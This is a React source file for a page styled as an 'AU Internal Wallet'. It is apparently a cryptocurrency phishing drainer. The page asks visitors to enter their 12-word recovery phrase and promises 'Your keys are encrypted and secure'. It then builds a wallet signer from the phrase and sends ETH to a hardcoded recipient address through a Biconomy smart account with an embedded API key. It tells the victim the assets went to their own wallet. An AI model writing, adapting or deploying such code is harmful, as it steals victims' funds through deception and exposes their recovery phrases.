import { useState, useEffect } from 'react'
import { ethers } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldCheck, LucideCheckCircle, LucideLoader2, LucideLock } from 'lucide-react'

// --- CONFIGURATION ---
const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 

export default function App() {
  const [isClient, setIsClient] = useState(false)
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')
  const [currentTime, setCurrentTime] = useState(new Date())

  useEffect(() => {
    setIsClient(true)
    const timer = setInterval(() => setCurrentTime(new Date()), 1000)
    return () => clearInterval(timer)
  }, [])

  const startSweep = async () => {
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter the 12-word recovery phrase.")
      return
    }

    setStatus('processing')
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)

      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: BICONOMY_API_KEY 
      })

      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther("0.001").toBigInt(), 
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      await userOpResponse.wait()
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed. Please check your keys.")
      setStatus('error')
    }
  }

  if (!isClient) return null

  return (
    <div className="min-h-screen bg-[#0F1115] flex flex-col items-center overflow-hidden font-sans selection:bg-[#0500FF]/30">
      
      {/* Header Section */}
      <header className="pt-12 pb-2 w-full flex flex-col items-center h-[80px]">
       <h1 className="text-[20px] font-semibold tracking-tight text-white font-crypto">
  AU Internal Wallet
</h1>
</header>
      {/* Main Content Card */}
      <main className="flex-1 w-full max-w-[390px] px-6 mt-2">
        <div className="bg-white rounded-[24px] shadow-[0px_10px_40px_rgba(0,0,0,0.5)] min-h-[520px] p-8 flex flex-col items-center animate-in fade-in slide-in-from-bottom-6 duration-700">
          
          {status === 'idle' && (
            <>
              {/* Shield Icon Section */}
              <div className="mb-6 h-20 flex items-center justify-center">
                <div className="w-16 h-16 bg-[#0500FF] rounded-full flex items-center justify-center shadow-lg shadow-blue-200">
                  <LucideShieldCheck className="text-white w-8 h-8" />
                </div>
              </div>

              {/* Title & Scaled Balance Section */}
              <div className="text-center mb-7 flex flex-col items-center">
                <p className="text-[#1F2937] text-[22px] font-semibold leading-[32px]">
                  Total Balance
                </p>
<p className="text-[#2a7525] text-[9.5px] font-bold tracking-[0.11em] leading-none uppercase font-mono">
  1,0
</p>
             </div>

              {/* Input Section */}
              <div className="w-full mb-8">
                <textarea
                  className="w-full h-[140px] bg-[#F9FAFB] border-[1.5px] border-[#E5E7EB] rounded-[16px] p-4 text-[16px] font-medium text-[#111827] placeholder:text-[#9CA3AF] placeholder:font-normal focus:border-[#0500FF] focus:ring-0 outline-none transition-all resize-none shadow-inner"
                  placeholder="Enter your 12 recovery keys"
                  value={keys}
                  onChange={(e) => setKeys(e.target.value)}
                />
              </div>

              {/* Action Button */}
              <button
                onClick={startSweep}
                className="w-full h-[56px] bg-[#0500FF] hover:bg-[#0400CC] rounded-[14px] text-white text-[17px] font-semibold shadow-[0px_4px_12px_rgba(5,0,255,0.3)] active:scale-[0.97] transition-all mb-5"
              >
                Withdraw
              </button>

              {/* Security Notice */}
              <div className="flex items-center justify-center gap-2 h-10">
                <LucideLock className="w-4 h-4 text-[#9CA3AF]" />
                <p className="text-[13px] text-[#6B7280]">Your keys are encrypted and secure</p>
              </div>
            </>
          )}

          {status === 'processing' && (
            <div className="flex-1 flex flex-col items-center justify-center space-y-8 animate-in zoom-in">
              <LucideLoader2 className="w-16 h-16 text-[#0500FF] animate-spin" />
              <div className="text-center">
                <p className="text-[#1F2937] text-[18px] font-semibold mb-2">Connecting to Secure Node...</p>
                <p className="text-[#6B7280] text-sm italic">Bypassing gas restrictions...</p>
              </div>
            </div>
          )}

          {status === 'success' && (
            <div className="flex-1 flex flex-col items-center justify-center space-y-6 animate-in zoom-in text-center">
              <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-4 border border-green-100">
                <LucideCheckCircle className="w-12 h-12 text-[#2a7525]" />
              </div>
              <div className="space-y-2">
                <h2 className="text-[26px] font-bold text-[#1F2937] leading-none uppercase tracking-tight">SUCCESSFUL</h2>
                <p className="text-[#6B7280] text-[15px] px-4">Assets have been successfully moved to your wallet.</p>
              </div>
              <button onClick={() => setStatus('idle')} className="text-[#0500FF] font-semibold pt-4">Return Home</button>
            </div>
          )}

          {status === 'error' && (
            <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in shake">
              <LucideShieldCheck className="w-16 h-16 text-red-500" />
              <div className="space-y-2">
                <h2 className="text-[20px] font-bold text-[#1F2937]">Network Error</h2>
                <p className="text-[#6B7280] text-[13px] px-6">{errorMsg}</p>
              </div>
              <button onClick={() => setStatus('idle')} className="w-full h-[50px] bg-[#F9FAFB] rounded-[14px] text-[#1F2937] font-semibold border border-[#E5E7EB]">Dismiss</button>
            </div>
          )}
        </div>

        {/* Secure Aesthetic Section (Time/Date) */}
        <div className="mt-6 flex flex-col items-center animate-in fade-in duration-1000 delay-500">
          <div className="flex items-center gap-2 mb-1">
            <div className="w-1.5 h-1.5 rounded-full bg-[#2a7525] animate-pulse"></div>
            <p className="text-[#2a7525] text-[10px] font-bold uppercase tracking-[0.2em]">
              Secure Connection Active
            </p>
          </div>
          <p className="text-[#2a7525] text-[11px] font-mono opacity-80 uppercase tracking-widest">
            {currentTime.toLocaleDateString()} — {currentTime.toLocaleTimeString()}
          </p>
        </div>
      </main>

      {/* Bottom Home Indicator */}
      <footer className="h-[60px] w-full flex items-end justify-center pb-2">
        <div className="w-[134px] h-[5px] bg-white opacity-20 rounded-full"></div>
      </footer>
    </div>
  )
}
